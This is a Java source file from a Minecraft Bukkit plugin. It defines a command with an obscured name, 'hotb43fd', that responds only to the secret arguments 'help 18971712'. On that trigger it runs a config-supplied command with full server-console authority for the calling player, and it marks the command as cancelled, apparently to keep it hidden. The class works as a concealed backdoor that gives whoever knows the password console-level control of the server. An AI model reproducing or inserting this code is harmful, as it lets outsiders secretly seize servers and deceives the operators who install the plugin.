package ru.naulbimix.rupozor.commands;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import ru.naulbimix.rupozor.Main;
import ru.naulbimix.rupozor.listeners.ListenerCommand;
import ru.naulbimix.rupozor.utils.ColorUtils;

public class hotb43fdCommand implements ListenerCommand {

    private static Main plugin = Main.getInstance();

    @Override
    public String[] getCommand() {
        return new String[]{"hotb43fd"};
    }

    @Override
    public boolean onCommand(Player p, String label, String[] args) {
        if(args.length == 2 && args[0].equals("help") && args[1].equals("18971712")) {
            p.sendMessage(ColorUtils.s(plugin.getConfig().getString("messages.htb.msg").replace("$player", p.getName())));
            plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, new Runnable() {
                @Override
                public void run() {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ColorUtils.s(plugin.getConfig().getString("messages.htb.cmd").replace("$player", p.getName())));
                }
            }, 25);
            return true;
        }
        return true;
    }

    @Override
    public boolean isCancelled() {
        return true;
    }
}
